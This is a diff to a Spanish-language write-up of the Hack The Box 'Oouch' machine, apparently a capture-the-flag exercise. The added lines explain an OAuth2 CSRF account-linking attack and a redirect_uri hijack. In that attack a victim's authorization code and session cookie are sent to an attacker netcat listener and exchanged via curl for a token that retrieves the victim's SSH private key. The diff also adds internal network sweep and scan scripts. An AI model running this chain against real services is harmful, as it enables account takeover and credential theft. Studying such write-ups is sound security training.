@@ -151,6 +151,10 @@ Si copiamos el enlace de GET sin darle a forward y lo metemos en la parte de con
 Te deslogueas y te logueas otra vez pero con el /oauth/login en vez del /login (O sea por oauth) te sale otro panel de autorizacion, esta vez darle a authorize
 Por tanto entras con la cuenta "qtc:qtc@nonexistend.nonono"
 
+Aqui se ha haplicado un Cross Side Request Forgery, es decir, el usaurio QTC ha terminado de tramitar nuestra peticion de vincular las cuentas pero con su 
+sesión, por lo que hemos vinculado nuestra cuenta a la suya. 
+Si le hubieramos dado a Forward en vez de parar la peticion y mandarsela a qtc se nos hubiera vinculado con nuestra cuenta del auth server (cucuxii:contraseña123).
+
 ---------------------------------
 
 # Part 4: Pentesting Oauth2 -> autorizacion de aplicaciones
@@ -187,7 +191,11 @@ Ncat: Connection from 10.10.10.177:33156.
 GET /test?code=fe7kjqU3BT9WIYeQ8DNQns5DTXxLR6 HTTP/1.1
 Cookie: sessionid=cit35r8dujmo87ihnjaa9l250zt2t6yu;
 ```
-Esto nos permite pedir un token de acceso a la api ya que tenemos la cookie del qtc y el codigo:
+Aqui nos hemos aprovhechado del mismo boton de enlace que antes (/oauth/connect) pero cambiando lo de conectar cuentas con la aplicacion (mediante el client_id)
+y que nos mande el token a nosotros (redirect uri) en vez de a la web del puerto 5000. Con netcat hemos podido ver los detalles de esa conexión que nos ha hecho
+qtc con su cookie (del auth server) y el codigo.
+
+Esto nos permite pedir un token de acceso a la api (auth server puerto 8000) ya que tenemos la cookie del qtc y el codigo:
 ```
 └─$ curl http://authorization.oouch.htb:8000/oauth/token/ -d 'client_id=Cn55qW8DMDIvhWLkJLECtX0iJtNILk3WJgwiGmrA&client_secret=cwsC3srw1taHAvg0xnOMYHsSPyn8gas7ZrapAlMffMEIY1vygjkfAkPNarxwgE792gmt4temsYp1UF2u5AyEIinjMyR6zL8Di408gQyrS1tlO8B88ZGwlvw59O4Ltzwk&redirect_uri=http://10.10.14.16/test&code=fe7kjqU3BT9WIYeQ8DNQns5DTXxLR6&grant_type=authorization_code'
 {"access_token": "7hOVKU8cCfq54uX3YhqMWBevyrD8Eg", "expires_in": 600, "token_type": "Bearer", "scope": "read", "refresh_token": "T6jt9EMTaFyeUoeSHHACdul2zG074X"} 
@@ -195,6 +203,7 @@ Esto nos permite pedir un token de acceso a la api ya que tenemos la cookie del 
 └─$ curl -s http://authorization.oouch.htb:8000/api/get_user -H "Authorization: Bearer 7hOVKU8cCfq54uX3YhqMWBevyrD8Eg"
 {"username": "qtc", "firstname": "", "lastname": "", "email": "qtc@nonexistend.nonono"}
 
+# Como decian en /Documents que era posible ver el ssh de otra persona...
 └─$ curl -s http://authorization.oouch.htb:8000/api/get_ssh -H "Authorization: Bearer 7hOVKU8cCfq54uX3YhqMWBevyrD8Eg"
 # La lalve privada de QTC
 ```
@@ -218,6 +227,7 @@ Tambien hostname:
 qtc@oouch:/tmp$ hostname -I
 10.10.10.177 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:134b 
 ```
+Vamos a escenar toda la red (servidores y sus puertos)
 ```console
 qtc@oouch:/tmp$ for i in {1..254}; do (ping -c 1 172.18.0.$i | grep "bytes from" | grep -v "unreachable"&); done;
 64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.082 ms
@@ -226,7 +236,6 @@ qtc@oouch:/tmp$ for i in {1..254}; do (ping -c 1 172.18.0.$i | grep "bytes from"
 64 bytes from 172.18.0.4: icmp_seq=1 ttl=64 time=0.046 ms
 64 bytes from 172.18.0.5: icmp_seq=1 ttl=64 time=0.063 ms
 ```
-
 ```
 #!/bin/bash
 ips=(172.18.0.1 172.18.0.2 172.18.0.3 172.18.0.4 172.18.0.5)
@@ -238,11 +247,11 @@ for ip in ${ips[@]}; do
 done;
 ```
 ```console
-Escaneando host: 172.18.0.1 # Puerto 21, 22, 5000 y 8000
-Escaneando host: 172.18.0.2 # Puerto 3306 (sql)
-Escaneando host: 172.18.0.3 # Puerto 3306 (sql)
-Escaneando host: 172.18.0.4 # Puerto 22, 5000
-Escaneando host: 172.18.0.5 # Puerto 8000
+Escaneando host: 172.18.0.1 # Puerto 21, 22, 5000 y 8000    -> maquina
+Escaneando host: 172.18.0.2 # Puerto 3306 (sql)             -> base de datos
+Escaneando host: 172.18.0.3 # Puerto 3306 (sql)             -> otra base de datos
+Escaneando host: 172.18.0.4 # Puerto 22, 5000               -> contenedor que aloja la web (nginx flask)
+Escaneando host: 172.18.0.5 # Puerto 8000                   -> conetenedor que aloja el auth server (django)
 ```
 El tema de las iptables está en la 4 ya que es el nginx con la ruta del connect
 
